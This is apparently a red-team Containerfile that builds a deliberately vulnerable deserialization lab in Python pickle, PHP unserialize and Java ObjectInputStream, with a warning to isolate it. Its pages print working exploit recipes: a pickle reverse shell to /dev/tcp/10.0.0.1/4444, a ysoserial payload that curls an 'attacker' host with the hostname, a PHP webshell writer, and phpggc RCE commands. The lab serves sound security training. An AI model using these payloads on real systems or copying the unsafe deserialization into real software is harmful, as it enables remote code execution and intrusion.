# redteam/deserialization.Containerfile
# Multi-service container with vulnerable deserialization endpoints
# Python Flask (pickle), PHP (unserialize), Java (ObjectInputStream) on Tomcat
#
# WARNING: This container is intentionally vulnerable. Run it only on an
# isolated, trusted network and never expose it to the internet.
#
# Build:  podman build -t deser-lab -f redteam/deserialization.Containerfile .
# Run:    podman run -d -p 5000:5000 -p 8080:8080 -p 8081:8081 deser-lab
#
# Flask (pickle):    http://localhost:5000
# Tomcat (java):     http://localhost:8080/deser/api
# PHP (unserialize): http://localhost:8081

# ── Stage 1: Java/Tomcat App ──────────────────────────────────────────
FROM docker.io/library/openjdk:17-slim AS java-builder

RUN apt-get update && apt-get install -y wget unzip && rm -rf /var/lib/apt/lists/*

WORKDIR /app

# Download Tomcat and commons-collections for the gadget chain
RUN wget -q https://dlcdn.apache.org/tomcat/tomcat-9/v9.0.83/bin/apache-tomcat-9.0.83.tar.gz \
    && tar xzf apache-tomcat-9.0.83.tar.gz \
    && mv apache-tomcat-9.0.83 /opt/tomcat \
    && rm apache-tomcat-9.0.83.tar.gz

RUN wget -q https://repo1.maven.org/maven2/commons-collections/commons-collections/3.2.2/commons-collections-3.2.2.jar \
    -O /opt/tomcat/webapps/ROOT/WEB-INF/lib/commons-collections-3.2.2.jar 2>/dev/null || true

# Create vulnerable Java servlet
RUN mkdir -p /opt/tomcat/webapps/deser/WEB-INF/lib \
    && wget -q https://repo1.maven.org/maven2/commons-collections/commons-collections/3.2.2/commons-collections-3.2.2.jar \
       -O /opt/tomcat/webapps/deser/WEB-INF/lib/commons-collections-3.2.2.jar 2>/dev/null || true

RUN mkdir -p /opt/tomcat/webapps/deser/WEB-INF/classes

COPY <<'JAVAEOF' /tmp/DeserializeServlet.java
import javax.servlet.http.*;
import javax.servlet.annotation.*;
import java.io.*;
import java.util.Base64;

@WebServlet("/api")
public class DeserializeServlet extends HttpServlet {
    protected void doPost(HttpServletRequest req, HttpServletResponse resp)
            throws IOException {
        resp.setContentType("text/plain");
        String input = req.getParameter("data");
        if (input == null || input.isEmpty()) {
            resp.getWriter().write("Usage: POST /deser/api with data=<base64-serialized-object>");
            return;
        }
        try {
            byte[] decoded = Base64.getDecoder().decode(input);
            // Check for Java serialization magic bytes
            if (decoded.length < 4 || decoded[0] != (byte)0xac
                || decoded[1] != (byte)0xed || decoded[2] != 0x00 || decoded[3] != 0x05) {
                resp.getWriter().write("Error: Input does not appear to be a Java serialized object (missing AC ED 00 05 header)");
                return;
            }
            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(decoded));
            Object obj = ois.readObject();
            resp.getWriter().write("Deserialized: " + obj.toString());
        } catch (Exception e) {
            resp.getWriter().write("Error: " + e.getClass().getName() + ": " + e.getMessage());
        }
    }

    protected void doGet(HttpServletRequest req, HttpServletResponse resp)
            throws IOException {
        resp.setContentType("text/html");
        PrintWriter out = resp.getWriter();
        out.println("<!DOCTYPE html><html><head><title>Java Deserialization Lab</title></head><body>");
        out.println("<h1>Java Deserialization Endpoint</h1>");
        out.println("<p>POST to /deser/api with <code>data=&lt;base64-serialized-object&gt;</code></p>");
        out.println("<p>Expected Content-Type: application/x-www-form-urlencoded</p>");
        out.println("<h2>Gadgets Available</h2>");
        out.println("<ul>");
        out.println("<li>commons-collections 3.2.2 (CommonsCollections1-7, BadAttributeValueExpException)</li>");
        out.println("<li>JDK internal classes (Jdk7u21 available if on Java 7)</li>");
        out.println("</ul>");
        out.println("<p><pre>");
        out.println("Test URLDNS payload for detection:");
        out.println("java -jar ysoserial.jar URLDNS 'http://YOUR-COLLABORATOR' | base64 -w0");
        out.println("</pre></p>");
        out.println("<p><pre>");
        out.println("Exploit via CommonsCollections5:");
        out.println("java -jar ysoserial.jar CommonsCollections5 'curl http://attacker/$(hostname)' | base64 -w0");
        out.println("curl -X POST http://localhost:8080/deser/api -d 'data=BASE64_PAYLOAD'");
        out.println("</pre></p>");
        out.println("</body></html>");
    }
}
JAVAEOF

RUN mkdir -p /opt/tomcat/webapps/deser/WEB-INF/classes \
    && javac -cp /opt/tomcat/lib/servlet-api.jar:/opt/tomcat/webapps/deser/WEB-INF/lib/* \
       -d /opt/tomcat/webapps/deser/WEB-INF/classes /tmp/DeserializeServlet.java

# ── Stage 2: Python Flask App ─────────────────────────────────────────
FROM docker.io/library/python:3-slim AS python-runner

RUN pip install flask requests

WORKDIR /app

COPY <<'PYEOF' /app/app.py
from flask import Flask, request, make_response, render_template_string
import pickle
import base64
import os
import subprocess

app = Flask(__name__)

class UserSession:
    def __init__(self, username='anonymous', role='user'):
        self.username = username
        self.role = role

    def __repr__(self):
        return f"UserSession(username={self.username}, role={self.role})"


class LogWriter:
    """Demonstration gadget: writes attacker-controlled string to arbitrary file"""
    def __init__(self):
        self.logfile = '/tmp/debug.log'
        self.content = ''

    def __reduce__(self):
        return (os.system, (f'echo "{self.content}" >> {self.logfile}',))


def get_session_from_cookie():
    cookie = request.cookies.get('session')
    if not cookie:
        return UserSession()
    try:
        decoded = base64.b64decode(cookie.encode())
        return pickle.loads(decoded)
    except Exception as e:
        return UserSession(username=f'error: {e}')


@app.route('/')
def index():
    session = get_session_from_cookie()
    return render_template_string('''
    <!DOCTYPE html>
    <html><head><title>Python Pickle Deser Lab</title>
    <style>body{font-family:monospace;max-width:800px;margin:20px auto;padding:20px;background:#111;color:#0f0}
    pre{background:#222;padding:15px;overflow-x:auto}
    .hint{color:#ff0}</style></head><body>
    <h1>Python Pickle Deserialization Lab</h1>
    <p>Session: <strong>{{ session.username }}</strong> ({{ session.role }})</p>
    <p class="hint">Your session cookie is deserialized via <code>pickle.loads()</code></p>
    <hr>
    <h2>Exploitation</h2>
    <pre>
# Generate exploit payload
python3 -c '
import pickle, base64, os
class RCE:
    def __reduce__(self):
        return (os.system, ("id",))
print(base64.b64encode(pickle.dumps(RCE())).decode())
'
# Set cookie: session=PAYLOAD
curl -b "session=PAYLOAD" http://localhost:5000/
    </pre>
    <pre>
# Reverse shell payload
python3 -c '
import pickle, base64, os
class RevShell:
    def __reduce__(self):
        cmd = "bash -c \\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\\""
        return (os.system, (cmd,))
print(base64.b64encode(pickle.dumps(RevShell())).decode())
'
    </pre>
    <hr>
    <h2>Classes Available</h2>
    <ul>
    <li><code>UserSession</code> — user session class</li>
    <li><code>LogWriter</code> — demonstration gadget with <code>__reduce__</code></li>
    <li>Full Python stdlib: <code>os.system</code>, <code>subprocess.check_output</code>, <code>subprocess.Popen</code></li>
    </ul>
    </body></html>
    ''', session=session)


@app.route('/admin')
def admin():
    session = get_session_from_cookie()
    if session.role != 'admin':
        return 'Access denied — your role is ' + session.role, 403
    return 'Welcome admin! Sensitive data: flag{pickle_rce_confirmed}'


@app.route('/test', methods=['POST'])
def test_endpoint():
    """API endpoint that accepts raw pickle data"""
    data = request.get_data()
    if not data:
        return 'Send raw pickle bytes in POST body', 400
    try:
        obj = pickle.loads(data)
        return f'Deserialized: {repr(obj)}', 200
    except Exception as e:
        return f'Error: {e}', 500


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
PYEOF

# ── Stage 3: PHP Apache App ───────────────────────────────────────────
FROM docker.io/library/php:8-apache AS php-runner

RUN apt-get update && apt-get install -y libapache2-mod-php \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /var/www/html

COPY <<'PHPEOF' /var/www/html/index.php
<?php
// PHP Unserialize Vulnerable App
// Exploit: send base64-encoded serialized object as cookie or POST

class Logger {
    public $log_file = '/tmp/debug.log';
    public $message = '';

    function __destruct() {
        file_put_contents($this->log_file, $this->message, FILE_APPEND);
    }

    function __wakeup() {
        // CVE-2016-7124 bypass: set property count larger than actual
        echo "<!-- Logger::__wakeup() called -->";
    }
}

class DatabaseConnection {
    public $dsn;
    public $username;
    public $password;

    function __wakeup() {
        echo "<!-- DatabaseConnection::__wakeup() called -->";
        // Gadget: writes credentials to a log file on wakeup
        $log = sprintf("[%s] DSN=%s User=%s\n", date('c'), $this->dsn, $this->username);
        file_put_contents('/tmp/db_debug.log', $log, FILE_APPEND);
    }
}

class FileProcessor {
    public $filename;
    public $callback;

    function __toString() {
        if (is_callable($this->callback)) {
            return call_user_func($this->callback, $this->filename);
        }
        return 'Cannot process: ' . $this->filename;
    }
}

// ── Main Application ────────────────────────────────
$action = $_GET['action'] ?? 'info';

if ($action === 'info') {
    header('Content-Type: text/html');
?>
<!DOCTYPE html>
<html><head><title>PHP Unserialize Lab</title>
<style>body{font-family:monospace;max-width:800px;margin:20px auto;padding:20px;background:#111;color:#0f0}
pre{background:#222;padding:15px;overflow-x:auto}
.hint{color:#ff0}</style></head><body>
<h1>PHP Unserialize Lab</h1>
<p>This app uses <code>unserialize()</code> on user-supplied data.</p>

<h2>Endpoints</h2>
<ul>
  <li><strong>GET /?action=info</strong> — This page</li>
  <li><strong>GET /?action=deser&data=&lt;base64-serialized&gt;</strong> — Deserialize via GET parameter</li>
  <li><strong>POST /?action=deser</strong> with data= in body — Deserialize via POST</li>
  <li><strong>Cookie: user_data=&lt;base64-serialized&gt;</strong> — Deserialize from cookie</li>
</ul>

<h2>Available Gadget Classes</h2>
<pre>
class Logger {
    // __destruct() → file_put_contents($log_file, $message)
}
class DatabaseConnection {
    // __wakeup() → file_put_contents() with credentials
}
class FileProcessor {
    // __toString() → call_user_func($callback, $filename)
}
</pre>

<h2>Manual Exploitation</h2>
<pre>
# Generate PHP serialized payload
php -r '
class Logger {
    public $log_file = "/var/www/html/shell.php";
    public $message = "<?php system(\$_GET[cmd]); ?>";
}
echo base64_encode(serialize(new Logger())), PHP_EOL;
'

# Send exploit
curl "http://localhost:8081/?action=deser&data=PAYLOAD"
# Access webshell
curl "http://localhost:8081/shell.php?cmd=id"
</pre>

<h2>PHPGGC Exploitation</h2>
<pre>
# Using phpggc with Monolog (if Monolog is installed)
phpggc Monolog/RCE1 system 'id' -b

# Generate PHAR for file operation triggers
phpggc -p phar Monolog/RCE1 system 'id' -o exploit.phar
</pre>
</body></html>
<?php
    exit;
}

// Deserialization endpoint
$data = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = $_POST['data'] ?? null;
}

if ($data === null && isset($_GET['data'])) {
    $data = $_GET['data'];
}

// Also check cookie
if ($data === null && isset($_COOKIE['user_data'])) {
    $data = $_COOKIE['user_data'];
}

if ($data !== null) {
    $decoded = base64_decode($data);
    echo "<!-- Decoded length: " . strlen($decoded) . " bytes -->\n";

    if (preg_match('/^[a-zA-Z0-9\/+=]+$/', $data)) {
        // Looks like base64-encoded data
        $obj = @unserialize($decoded);
        if ($obj !== false) {
            echo "<p>Deserialized successfully: ";
            var_dump($obj);
            echo "</p>\n";
        } else {
            echo "<p>unserialize() returned false (invalid or truncated payload)</p>\n";
        }
    } else {
        echo "<p>Error: data parameter must be base64-encoded</p>\n";
    }
} else {
    // Cookie-based deserialization on every page load
    if (isset($_COOKIE['user_data'])) {
        $cookie_data = base64_decode($_COOKIE['user_data']);
        $obj = @unserialize($cookie_data);
        echo "<!-- Cookie unserialized: " . gettype($obj) . " -->\n";
    }
}
PHPEOF

# ── Stage 4: Combine Everything ──────────────────────────────────────
FROM docker.io/library/ubuntu:22.04

RUN apt-get update && apt-get install -y \
    apache2 \
    libapache2-mod-php \
    php \
    php-cli \
    default-jre-headless \
    python3 \
    python3-pip \
    curl \
    netcat-openbsd \
    procps \
    && rm -rf /var/lib/apt/lists/*

RUN pip3 install flask requests

# Copy Tomcat from builder
COPY --from=java-builder /opt/tomcat /opt/tomcat

# Copy PHP app
COPY --from=php-runner /var/www/html /var/www/html

# Copy Python app
COPY --from=python-runner /app /app

# Configure Apache PHP
RUN a2enmod php8.1 2>/dev/null || true

# Configure Apache document root (PHP pages are served through Apache on port 8081)
# PHP uses the same app files we already placed in /var/www/html
COPY <<'APACHEEOF' /etc/apache2/ports.conf
Listen 8081
<IfModule ssl_module>
    Listen 443
</IfModule>
<IfModule mod_gnutls.c>
    Listen 443
</IfModule>
APACHEEOF

COPY <<'VHOSTEOF' /etc/apache2/sites-available/000-default.conf
<VirtualHost *:8081>
    DocumentRoot /var/www/html
    <Directory /var/www/html>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
APACHEEOF

# Disable default port 80 site
RUN rm -f /etc/apache2/sites-enabled/* \
    && ln -s /etc/apache2/sites-available/000-default.conf /etc/apache2/sites-enabled/000-default.conf

# Startup script
RUN printf '#!/bin/bash\n\
set -e\n\
echo "=== Deserialization Lab Starting ==="\n\
echo "Starting Apache (PHP) on port 8081..."\n\
apache2ctl start\n\
echo "Starting Tomcat (Java) on port 8080..."\n\
/opt/tomcat/bin/startup.sh\n\
echo "Starting Flask (Python) on port 5000..."\n\
cd /app && python3 app.py\n' > /start.sh && chmod +x /start.sh

EXPOSE 5000 8080 8081

CMD ["/start.sh"]
